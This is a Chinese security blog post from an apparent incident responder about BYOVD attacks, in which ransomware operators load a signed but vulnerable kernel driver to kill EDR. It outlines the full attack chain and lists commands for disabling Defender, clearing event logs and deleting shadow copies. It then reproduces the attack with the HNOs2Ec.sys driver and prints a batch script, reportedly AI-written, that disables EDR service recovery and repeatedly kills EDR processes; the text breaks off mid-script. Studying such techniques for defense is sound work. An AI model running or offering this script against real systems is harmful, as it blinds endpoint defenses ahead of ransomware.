---
title: 应急实战之BYOVD技术初探
url: https://mp.weixin.qq.com/s/QLvG31GwhjZ3iGEh0p4vJw
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T07:04:41.625826
---

# 应急实战之BYOVD技术初探

# 应急实战之BYOVD技术初探

原创

白昼信安
白昼信安

白昼信安

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

最近半夜接到一起客户勒索应急：他们的 Windows 服务器上，EDR 进程突然消失了，紧接着卷影备份被清空，数小时后整个文件服务器被勒索软件加密。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yOiat0BJcib5ict5nJrYCFXUiaaJTOicqwTiaOy8FZHxpozrjGZw6hzbLXCcFTLs4SvOEGZHkgc0XNQ7njwYGpuHbLkwF4YEOqatY66os6uib9atPk/640?wx_fmt=png&from=appmsg)

查日志发现：

攻击者通过客户的web漏洞入侵，并上传byovd驱动与EDR对抗（由于服务器web日志被加密，无法溯源具体漏洞入口点，当然，这也不是今天重点）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yOiat0BJcib5ibXToOibB5GdqNaZJQEe4BQbTMycgxWCQhUZQfG26LVjvAicGc1tfrH1zoyUh2f95ibEibkjXSgXFBbMP2cgE5XpwiaeibjwD6UQbKBQ/640?wx_fmt=png&from=appmsg)

攻击者用这个有漏洞的驱动，发了一条 IOCTL，把 EDR 进程直接从内核里干掉了。

这也就是 **BYOVD（Bring Your Own Vulnerable Driver）**——当下勒索软件团伙的最爱。

## 一、BYOVD介绍

BYOVD（Bring Your Own Vulnerable Driver，自带漏洞驱动）是一种利用带有合法数字签名但存在漏洞的驱动，来获取内核模式（Ring-0）的执行权限的后渗透攻击策略。实际上BYOVD 严格说不是新东西。内核驱动一直是 Windows 安全模型的阿喀琉斯之踵，但大规模把它武器化是 2016 年以后的事。

### 经典 BYOVD 攻击链（6 阶段）

#### 阶段 1：初始入侵

攻击者拿到第一台机器的 shell。常见入口：

* **钓鱼邮件**：附件是带宏的 Word/Excel，LNK 快捷方式伪装成 PDF
* **Web 漏洞**：Exchange、Confluence、VPN 等公网组件的 Nday
* **暴露的 RDP**：弱口令或购买的初始访问代理（IAB）

落地的通常是一个 **loader / implant**（Cobalt Strike beacon、Brute Ratel、Sliver 等）。

#### 阶段 2：提权 + 持久化

* 用各种 UAC 绕过拿到 SYSTEM 权限
* 持久化：注册表 Run 键、计划任务、WMI Event Subscription、服务自启动

**关键点**：BYOVD 的所有操作都需要 **SYSTEM 权限**（SE\_LOAD\_DRIVER\_PRIVILEGE 只有 SYSTEM 才有）。所以提权是必做的前置步骤。

#### 阶段 3：侦察 EDR 牌面

杀掉 EDR 前要先**识别 EDR**：拿到 EDR 进程名和 PID 后，去 LOLDrivers 数据库里**挑一个对应的杀进程 PoC**。

#### 阶段 4：BYOVD 杀 EDR

这是 BYOVD 攻击的**核心动作**，分三步：

**落盘驱动**

攻击者使用Windows SCM（Service Control Manager，服务控制管理器）或调用`NtLoadDriver`API将漏洞驱动注册为内核服务并加载。Windows会验证其数字签名是否有效，并追溯到微软信任的根证书。但是签名验证流程是存在缺陷的，只有这些才被视为有效签名：

2015.07.29之前的旧证书：自Windows 10起，微软要求所有新的内核驱动都必须通过HDC（Hardware Dev Center，硬件开发中心）进行签名，而在此之前，开发者可以绕过微软使用第三方交叉证书自行签名。为了兼容，Windows将允许这些交叉签名的驱动加载，只要该交叉签名可追溯到可信CA。

已吊销的证书：由于驱动程序在系统启动过程早期加载，此时网络不可用，因此系统不会执行CRL（Certificate Revocation Lists，证书吊销列表）检查，只要签名时间戳（而非当前时间戳）位于证书有效期即可。

**注册内核服务**

驱动被加载进 **Ring 0**，创建设备对象 `\\.\TfSysMon`。

**发 IOCTL 杀进程**

大部分 AV/EDR 厂商**默认不监控 SCM 注册内核驱动这个动作**

至此 EDR 进程被内核的 `ZwTerminateProcess` 干掉了。

#### 阶段 5：擦痕迹 + 关防御

EDR 死后还有几件事要做：

* **杀 EDR 服务**（防止被守护进程拉起）
* **改注册表**禁用 Defender：`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1`
* **清事件日志**：`wevtutil cl Security`
* **关 ETW 追踪**（内核级 PatchEtwEventRegister）
* **删卷影备份**：`vssadmin delete shadows /all /quiet`
* **关 Sysmon**：停服务、清日志

#### 阶段 6：横向 + 加密

* 用 PsExec / WMI / SMB 批量推到内网其他机器
* 在每台机器上**重复 BYOVD 步骤**（不同机器可能是不同 EDR）
* 最后上勒索软件（LockBit、BlackCat、RansomHub 等家族）批量加密

最后勒索信 + 暗网泄露数据双重施压。

![](https://mmbiz.qpic.cn/mmbiz_png/yOiat0BJcib59jrhQor7DgzhuvxFMzzQ0RictdR7wPELTF7Waxwl1h2F3vYKn22qo6RElyoMbycM2UCByp420gHDcu2zeO1QxiceHMEqYttFvQE/640?wx_fmt=png&from=appmsg)

二、BYOVD技术分析

本次采用BlackSnufkin/BYOVD中的漏洞驱动HNOs2Ec作为案例，复现BYOVD攻击，并分析其技术原理。

#### 复现过程

先编译用到的载荷

```
cargo build --release -p HNOs2Ec-Killer
```

可以看到HNOs2Ec.sys驱动的数字签名证书是在有效期范围内的，所以仍会被微软认定为有效签名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yOiat0BJcib59nHwImhKpZGkFcibCHWVEyhrNGdK5NV1IE0eAyFiarx74lgqD0cIGtOlZt4Ne4OqzicAAc2cqE9huicvT6gEx1Cp6dxJf4eHv0NRQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/yOiat0BJcib582SJwpT6fMiaoKhduOvUO3OPQFmrYMTSzWKFiafw3cTWLE5ibUOOjw8wiaueBpJQmdt7OdQp8DpC1qrX2icS7lOgia5sOGMxSwSpu0k/640?wx_fmt=png&from=appmsg)

先将载荷送上目标机器

之后通过管理员权限启动cmd窗口，尝试直接杀进程，看下是否可行，可以看到结果显示失败：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yOiat0BJcib59PDiculUibhkdov3ZRlydxr423Lw4rWMia6fjLGbAt7JcQ4xibEXavI4JqYfykHjicUMDgPjES8cJ4PeLGvLXZ0yGfs6iaSc2DqACts/640?wx_fmt=png&from=appmsg)

尝试用载荷直接杀edr，但是通过后续发现edr一直没掉，之后看到xx服的edr不止一个进程，后续通过 `reg query` 翻注册表发现根因：4 个 xx服服务的 `FailureActions` 字段都设了 `restart/5000/...`，意思是"服务意外退出 → SCM5 秒后自动拉起"

![](https://mmbiz.qpic.cn/mmbiz_png/yOiat0BJcib5ibqvmfykGiaC6t3wPpaHDrdURU7S0MLM9aXrquKAqkMpVcJ0cxDgpjw1hHuaURj2ibNDGY3A86mct2POMicWEV8w5XsgXZ47fGxaU/640?wx_fmt=png&from=appmsg)

**SCM是什么？**

**SCM = Service Control Manager**，Windows 系统服务管理子系统，本体是 `services.exe`

**SCM 的三个核心职责**

1. **服务注册表**：`HKLM\SYSTEM\CurrentControlSet\Services\` 下每个子键描述一个服务的 ImagePath / StartType / DependOnService / FailureActions
2. **进程生命周期管理**：StartService / StopService / ControlService，对应启动 / 停止 / 控制码
3. **故障恢复**：服务异常退出时，按 `FailureActions` 决策 → run外部命令 / restart 服务 / reboot 机器

于是我让AI写了个脚本，把 4 个服务的 SCM 重启行为置为 no-op

```
@echo offsetlocal EnableDelayedExpansion
:: ============================================================::  EDR BYOVD Kill Chain + Persistent Suppression::  Method : HNOs2Ec.sys vulnerable driver - Honor, signed::  PoC    : C:\Program Files\HONOR\PCManager\PCManager.exe::  Usage  : Right-click -> Run as administrator::  Stop   : Press Ctrl+C in the cmd window:: ============================================================
set "PC_DIR=C:\Program Files\HONOR\PCManager"set "PC_EXE=PCManager.exe"set "SYS_FILE=HNOs2Ec.sys"set "SVC_NAME=HNOs2Ec"
:: --- Admin check ---net session >nul 2>&1if %errorlevel% neq 0 (    echo [X] Must run as administrator. Right-click - Run as administrator.    pause    exit /b 1)
clsecho ============================================================echo    EDR BYOVD Kill Chain + Persistent Suppressionecho    %DATE% %TIME%echo ============================================================echo.
:: --- Step 1: Verify ---echo [STEP 1] Verify files ...if not exist "%PC_DIR%\%PC_EXE%" (    echo [X] Missing %PC_DIR%\%PC_EXE%    echo     Copy PCManager.exe and HNOs2Ec.sys into: %PC_DIR%    pause    exit /b 1)if not exist "%PC_DIR%\%SYS_FILE%" (    echo [X] Missing %PC_DIR%\%SYS_FILE%    pause    exit /b 1)echo [OK] PCManager.exe  -- %PC_DIR%\%PC_EXE%echo [OK] HNOs2Ec.sys    -- %PC_DIR%\%SYS_FILE%echo.
:: --- Step 2: Disable SCM auto-restart ---echo [STEP 2] Disable SCM auto-restart ...for %%S in (abs_deployer edr_monitor savsvc eaio_service) do (    sc failure %%S actions= none reset= 0 >nul 2>&1    if !errorlevel! equ 0 (echo [OK] sc failure %%S) else (echo [! ] sc failure %%S skipped))echo.
:: --- Step 2.5: Change to demand start ---echo [STEP 2.5] Change  services to demand start ...for %%S in (abs_deployer edr_monitor savsvc eaio_service) do (    sc config %%S start= demand >nul 2>&1    if !errorlevel! equ 0 (echo [OK] sc config %%S start= demand) else (echo [! ] sc config %%S skipped))echo.
:: --- Step 3: Kill supervisors ---echo [STEP 3] Kill supervisors - abs_deployer + edr_monitor ...pushd "%PC_DIR%"call :run_killer abs_deployer.exetimeout /t 2 /nobreak >nulcall :run_killer edr_monitor.exetimeout /t 3 /nobreak >nulpopdecho.
:: --- Step 4: Kill remaining user-mode processes ---echo [STEP 4] Kill remaining  user-mode processes ...pushd "%PC_DIR%"for %%P in (avsvc.exe edr_agent.exe aagent.exe ipc_proxy.exe x_agent.exe ^            io_wtmkproc.exe io_agent.exe io_service.exe ^            avtray.exe avui.exe updatemgr.exe) do (    call :run_killer %%P    timeout /t 2 /nobreak >nul)popdecho.
:: --- Step 5: Verify ---echo [STEP 5] Verify user-mode processes are gone ...echo.set "ALL_DEAD=1"for %%P in (abs_deployer edr_monitor avsvc edr_agent aagent ^            ipc_proxy xs_agent io_wtmkproc io_agent io_service ^            avtray sfavui updatemgr) do (    tasklist /FI "IMAGENAME eq %%P.exe" 2>nul | findstr /i %%P >nul    if !errorlevel! equ 0 (        echo [X]  %%P.exe  STILL ALIVE        set "ALL_DEAD=0"    ) else (        echo [OK] %%P.exe  gone    ))echo.
:: --- Step 5.5: Second pass for respawners ---echo [STEP 5.5] Second pass - kill stubborn respawners ...pushd "%PC_DIR%"set "ROUNDS=0":respawn_loopset /a ROUNDS+=1echo     Round !ROUNDS! ...set "FOUND=0"for %%P in (abs_deployer.exe avsvc.exe) do (    tasklist /FI "IMAGENAME eq %%P" 2>nul | findstr /i %%P >nul    if !errorlevel! equ 0 (        set "FOUND=1"        echo     Re-killing %%P ...        call :run_killer %%P        timeout /t 3 /nobreak >nul    ))if !FOUND! equ 1 (    if !ROUNDS! lss 5 goto :respawn_loop)popdecho.
:: --- Step 6: Final verify ---echo [STEP 6] Final verify ...echo.set "ALL_DEAD=1"for %%P in (abs_deployer edr_monitor avsvc edr_agent aagent ^            ipc_proxy...